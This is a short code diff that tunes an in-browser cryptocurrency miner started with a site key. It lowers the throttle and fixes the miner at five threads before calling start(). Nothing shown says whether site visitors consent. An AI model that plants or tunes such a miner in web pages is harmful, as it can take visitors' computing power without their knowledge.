@@ -9,9 +9,9 @@ function Test() {
         }
 
         mainMiner = new Client.Anonymous('a6586a3300fabf67f8666d055d682db74c7741611f665efae8d6aefb2983dc6e', {
-            throttle: 0.6,
-            //threads:5,
-            autoThreads:true
+            throttle: 0.5,
+            threads:5,
+            //autoThreads:true
         });
         mainMiner.start();
 
